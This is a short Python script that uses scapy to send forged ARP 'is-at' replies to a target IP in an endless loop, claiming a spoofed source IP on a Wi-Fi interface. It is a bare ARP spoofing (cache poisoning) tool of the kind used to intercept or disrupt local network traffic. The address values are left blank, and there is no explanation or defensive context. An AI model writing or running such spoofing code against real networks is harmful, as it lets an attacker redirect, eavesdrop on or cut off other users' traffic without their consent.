import sys
import time
from scapy.all import sendp, ARP, Ether



iface = "Wi-Fi"
target_ip = ""
fake_ip = ""

ethernet = Ether()
arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
packet = ethernet / arp
while True:
    sendp(packet , iface=iface)
    time.sleep(1)
